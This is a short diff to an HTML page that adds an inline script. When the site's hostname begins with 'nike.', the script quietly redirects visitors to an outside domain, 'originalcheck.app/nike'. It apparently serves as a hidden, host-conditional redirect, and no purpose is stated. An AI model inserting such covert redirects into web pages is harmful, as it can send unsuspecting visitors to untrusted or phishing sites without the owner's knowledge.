@@ -831,5 +831,11 @@
             // Show install button or banner here if needed
         });
     </script>
+    <script>
+      const host = window.location.hostname;
+      if (host.startsWith("nike.")) {
+        window.location.href = "https://originalcheck.app/nike";
+      }
+    </script>
 </body>
 </html>
